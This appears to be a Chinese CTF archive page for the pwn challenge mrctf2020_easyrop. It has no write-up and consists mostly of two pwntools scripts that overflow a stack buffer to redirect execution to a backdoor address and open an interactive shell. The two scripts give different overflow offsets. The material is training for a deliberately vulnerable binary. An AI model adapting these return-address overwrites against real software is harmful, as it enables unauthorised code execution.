# 知识点

Stack

# 题目分析

分类：PWN / Stack。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [mrctf2020_easyrop](mrctf2020_easyrop)
- [mrctf2020_easyrop.py](mrctf2020_easyrop.py)

尚无可匹配的题解正文，当前保留附件及已有脚本，分析结论待补。

# EXP

- [mrctf2020_easyrop.py](mrctf2020_easyrop.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
from pwn import*
context(arch="amd64",log_level="debug")
#p=process("./mrctf2020_easyrop")
p=remote("challenge.example.invalid", 9999, ssl=True, sni="challenge.example.invalid")
back=0x40072A
p.sendline(str(2))
#sleep(1)
payload1=b'a'*0x300
p.send(payload1)
#p.sendlineafter(str(2),payload1)
p.sendline(str(7))
#sleep(1)
payload=b'a'*0x12+p64(back)
p.send(payload)
#p.sendlineafter(str(7),payload)
p.interactive()


from pwn import *
context.binary = './mrctf2020_easyrop'
context.log_level = 'debug'
p = process(context.binary.path)
back = 0x40072A
# 第一轮：填充缓冲区
p.sendline(b'2')
p.sendafter(
    b'hehehehehehehe\n',
    b'A' * 0x2ff + b'\x00'
)
# 第二轮：覆盖 main 的返回地址
p.sendline(b'7')
payload = b'B' * 0x19 + p64(back)
p.sendafter(b'bybybybybybyby\n', payload)
p.interactive()
```
